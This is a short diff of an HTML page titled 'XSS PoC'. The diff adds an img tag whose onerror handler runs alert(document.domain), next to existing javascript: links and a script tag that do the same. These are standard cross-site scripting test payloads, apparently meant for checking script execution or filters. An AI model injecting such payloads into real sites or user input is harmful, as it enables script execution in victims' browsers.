@@ -3,6 +3,7 @@
 	<body>
 		<h1>XSS PoC</h1>
 		<a href="javascript:alert(document.domain)">alert</a>
+		<img src onerror="alert(document.domain)">
 		<a href="javascript:console.log(document.domain)">log</a>
 		<a href="https://example.com">exteral</a>
 		<script>alert(document.domain)</script>
